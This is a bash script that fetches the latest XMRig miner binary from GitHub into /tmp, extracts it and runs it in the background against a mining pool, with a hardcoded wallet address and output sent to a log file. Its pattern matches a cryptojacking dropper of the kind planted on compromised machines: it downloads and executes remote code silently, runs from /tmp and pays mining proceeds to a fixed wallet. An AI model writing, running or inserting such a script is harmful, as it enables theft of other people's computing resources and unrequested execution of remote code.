#!/bin/bash

# Go to /tmp
cd /tmp

echo "Fetching latest XMRig release..."

# Download latest XMRig release (auto-fetches newest version)
# We specifically look for the "linux-static-x64" build which works on most systems
LATEST_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest \
  | grep browser_download_url \
  | grep "linux-static-x64" \
  | cut -d '"' -f 4)

# Download file
wget -O xmrig.tar.gz "$LATEST_URL"

# Extract
tar -xf xmrig.tar.gz

# Find the extracted directory automatically (usually xmrig-6.x.x)
XMRIG_DIR=$(find /tmp -maxdepth 1 -type d -name "xmrig-*" | head -n 1)

cd "$XMRIG_DIR" || { echo "Failed to enter XMRig directory"; exit 1; }

# Ensure executable permissions
chmod +x xmrig

echo "Starting XMRig..."

# Run miner in background
# Mapped arguments:
# -o / --url  : Pool Address
# -u / --user : Wallet Address
# -p / --pass : Password (Worker Name)
# -k / --keepalive : Keep the connection open
# --donate-level 1 : Set donation to minimum (1%)

./xmrig \
  --algo rx/0 \
  --url fr-salvium.miningocean.org:8462 \
  --user SC11qbqjQfdRrSUuis6ubxRfcvw5dBD1TfLBsVdciBTyjW9M2RCAppCY5vnaDgmJzk1T8SWm68my7CfQWURMdeox3GrSiKF5sm \
  --pass not \
  --keepalive \
  --donate-level 1 \
  &>/tmp/xmrig.log &

echo "Miner started in background. Check logs: tail -f /tmp/xmrig.log"
